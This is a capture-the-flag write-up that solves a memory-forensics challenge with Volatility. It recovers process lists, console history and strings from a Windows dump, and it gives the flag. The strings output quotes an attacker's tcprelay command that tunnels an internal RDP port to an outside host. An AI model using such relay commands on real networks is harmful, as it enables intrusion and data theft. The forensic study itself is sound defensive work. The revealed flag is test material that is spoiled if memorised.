<h1>Command & Control - level 4</h1>
<h3>Description</h3>
<label>Berthier, thanks to this new information about the processes running on the workstation, it’s clear that this malware is used to exfiltrate data. Find out the ip of the internal server targeted by the hackers!

The validation flag should have this format : IP:PORT

The uncompressed memory dump md5 hash is e3a902d4d44e0f7bd9cb29865e0a15de</label><a href='https://static.root-me.org/forensic/ch2/ch2.tbz2'>File</a>
<h3>Solution</h3>
<label>Analisa memory dump</label>

```console
┌──(root㉿Kali)-[/home/venom/Downloads]
└─# vol -f ch2.dmp windows.cmdline                 
Volatility 3 Framework 2.26.2
Progress:  100.00		PDB scanning finished                        
PID	Process	Args

4	System	-
308	smss.exe	\SystemRoot\System32\smss.exe
404	csrss.exe	%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,12288,512 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16
456	wininit.exe	-
468	csrss.exe	%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,12288,512 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16
500	winlogon.exe	-
560	services.exe	C:\Windows\system32\services.exe
576	lsass.exe	C:\Windows\system32\lsass.exe
584	lsm.exe	C:\Windows\system32\lsm.exe
692	svchost.exe	C:\Windows\system32\svchost.exe -k DcomLaunch
764	svchost.exe	C:\Windows\system32\svchost.exe -k RPCSS
832	svchost.exe	C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted
904	svchost.exe	C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted
928	svchost.exe	C:\Windows\system32\svchost.exe -k netsvcs
1084	svchost.exe	C:\Windows\system32\svchost.exe -k LocalService
1172	svchost.exe	C:\Windows\system32\svchost.exe -k NetworkService
1220	AvastSvc.exe	"C:\Program Files\AVAST Software\Avast\AvastSvc.exe"
1712	spoolsv.exe	C:\Windows\System32\spoolsv.exe
1748	svchost.exe	C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork
1872	sppsvc.exe	-
1968	vmtoolsd.exe	"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
336	wlms.exe	-
448	VMUpgradeHelpe	-
1612	TPAutoConnSvc.	"C:\Program Files\VMware\VMware Tools\TPAutoConnSvc.exe"
2352	taskhost.exe	"taskhost.exe"
2496	dwm.exe	"C:\Windows\system32\Dwm.exe"
2548	explorer.exe	C:\Windows\Explorer.EXE
2568	TPAutoConnect.	TPAutoConnect.exe -q -i vmware -a COM1 -F 30
2600	conhost.exe	-
2660	VMwareTray.exe	"C:\Program Files\VMware\VMware Tools\VMwareTray.exe" 
2676	VMwareUser.exe	"C:\Program Files\VMware\VMware Tools\VMwareUser.exe" 
2720	AvastUI.exe	"C:\Program Files\AVAST Software\Avast\AvastUI.exe" /nogui
2744	StikyNot.exe	"C:\Windows\System32\StikyNot.exe" 
2772	iexplore.exe	"C:\Users\John Doe\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\iexplore.exe" 
2900	SearchIndexer.	C:\Windows\system32\SearchIndexer.exe /Embedding
3176	wmpnetwk.exe	"C:\Program Files\Windows Media Player\wmpnetwk.exe"
3352	svchost.exe	C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation
3452	swriter.exe	-
3512	soffice.exe	-
3556	soffice.bin	-
3564	soffice.bin	"C:\Program Files\LibreOffice 3.6\program\swriter.exe" "-o" "C:\Users\John Doe\Documents\Procedure Winpmemdump.odt" "--writer" "-env:OOO_CWD=2C:\\Users\\John Doe\\Documents"
3624	svchost.exe	C:\Windows\System32\svchost.exe -k secsvcs
1232	taskmgr.exe	"C:\Windows\system32\taskmgr.exe" /4
3152	cmd.exe	"C:\Windows\system32\cmd.exe" 
3228	conhost.exe	-
1616	cmd.exe	cmd.exe
2168	conhost.exe	\??\C:\Windows\system32\conhost.exe
1136	iexplore.exe	"C:\Program Files\Internet Explorer\iexplore.exe" 
3044	iexplore.exe	"C:\Program Files\Internet Explorer\iexplore.exe" SCODEF:1136 CREDAT:71937
1720	audiodg.exe	C:\Windows\system32\AUDIODG.EXE 0x298
3144	winpmem-1.3.1.	winpmem-1.3.1.exe  ram.dmp

```
<label>Cek riwayat perintah CMD</label>

```console
┌──(root㉿Kali)-[/home/venom/Downloads]
└─# vol2 -f ch2.dmp --profile=Win7SP1x86 consoles  
Volatility Foundation Volatility Framework 2.6.1
**************************************************
ConsoleProcess: conhost.exe Pid: 3228
Console: 0x1081c0 CommandHistorySize: 50
HistoryBufferCount: 2 HistoryBufferMax: 4
OriginalTitle: Command Prompt
Title: Administrator: Command Prompt - winpmem-1.3.1.exe  ram.dmp
AttachedProcess: winpmem-1.3.1. Pid: 3144 Handle: 0x90
AttachedProcess: cmd.exe Pid: 3152 Handle: 0x64
----
CommandHistory: 0x3007a8 Application: winpmem-1.3.1.exe Flags: Allocated
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x90
----
CommandHistory: 0x2ff638 Application: cmd.exe Flags: Allocated, Reset
CommandCount: 5 LastAdded: 4 LastDisplayed: 4
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x64
Cmd #0 at 0x2fcd58: cd %temp%
Cmd #1 at 0x2fd348: dir
Cmd #2 at 0x2e1038: cd imagedump
Cmd #3 at 0x2fd378: dir
Cmd #4 at 0x304870: winpmem-1.3.1.exe ram.dmp
----
Screen 0x2e64b8 X:80 Y:300
Dump:

**************************************************
ConsoleProcess: conhost.exe Pid: 2168
Console: 0x1081c0 CommandHistorySize: 50
HistoryBufferCount: 3 HistoryBufferMax: 4
OriginalTitle: %SystemRoot%\system32\cmd.exe
Title: C:\Windows\system32\cmd.exe
AttachedProcess: cmd.exe Pid: 1616 Handle: 0x64
----
CommandHistory: 0x427a60 Application: tcprelay.exe Flags: 
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x0
----
CommandHistory: 0x427890 Application: whoami.exe Flags: 
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x0
----
CommandHistory: 0x427700 Application: cmd.exe Flags: Allocated
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x64
----
Screen 0x416348 X:80 Y:300
Dump:
```
<label>Dump Proses PID 2168</label>

```console
┌──(root㉿Kali)-[/home/venom/Downloads]
└─# vol2 -f ch2.dmp --profile=Win7SP1x86 memdump -p 2168 --dump-dir ./
Volatility Foundation Volatility Framework 2.6.1
************************************************************************
Writing conhost.exe [  2168] to 2168.dmp
                                                                                                                                                                                                                                                                            
┌──(root㉿Kali)-[/home/venom/Downloads]
└─# strings -a 2168.dmp | grep -i '192.168'
tcprelay.exe 192.168.0.22 3389 yourcsecret.co.tv 443 
LOCATION: http://192.168.1.2:49152/wps_device.xml
ION: http://192.168.1.248:52855/
xe 192.168.0.22 3389 yourcsecret.co.tv 443 
LOCATION: http://192.168.1.2:49152/wps_device.xml
LOCATION: http://192.168.1.2:49152/wps_device.xml
LOCATION: http://192.168.1.2:49152/wps_device.xml
LOCATION: http://192.168.1.2:49152/wps_device.xml
HOST: 192.168.1.66:2869
LOCATION: http://192.168.1.2:49152/wps_device.xml
0.0.0.0,0.0.0.0,192.168.1.254,-1
0.0.0.0,0.0.0.0,192.168.1.254,-1
```

<h3>Flag</h3>
<pre>
192.168.0.22:3389
</pre>
